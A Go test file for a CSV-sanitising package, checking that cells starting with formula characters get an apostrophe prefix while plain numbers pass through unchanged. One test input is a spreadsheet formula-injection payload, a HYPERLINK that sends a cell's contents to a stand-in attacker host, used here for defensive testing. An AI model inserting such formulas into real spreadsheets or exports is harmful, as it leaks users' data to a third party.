package csvsafe

import (
	"slices"
	"testing"
)

func TestCellNeutralisesFormulaPrefixes(t *testing.T) {
	for in, want := range map[string]string{
		`=HYPERLINK("https://attacker.invalid/?"&A1,"open")`: `'=HYPERLINK("https://attacker.invalid/?"&A1,"open")`,
		"+1+1":       "'+1+1",
		"-1+1":       "'-1+1",
		"-":          "'-",
		"--5":        "'--5",
		"-1e5":       "'-1e5",
		"@SUM(A1)":   "'@SUM(A1)",
		"\t=1+1":     "'\t=1+1",
		"\r=1+1":     "'\r=1+1",
		"":           "",
		"claude":     "claude",
		"a=b":        "a=b",
		"/v1/models": "/v1/models",
		// Numbers are not formulas.
		"-5":        "-5",
		"+3.25":     "+3.25",
		"0.010000":  "0.010000",
		"-0.500000": "-0.500000",
		"12":        "12",
	} {
		if got := Cell(in); got != want {
			t.Errorf("Cell(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestRecordCopiesEveryCell(t *testing.T) {
	in := []string{"=1+1", "ok", "-2"}
	got := Record(in)
	if want := []string{"'=1+1", "ok", "-2"}; !slices.Equal(got, want) {
		t.Fatalf("Record = %q, want %q", got, want)
	}
	if in[0] != "=1+1" {
		t.Fatal("Record changed its input")
	}
}
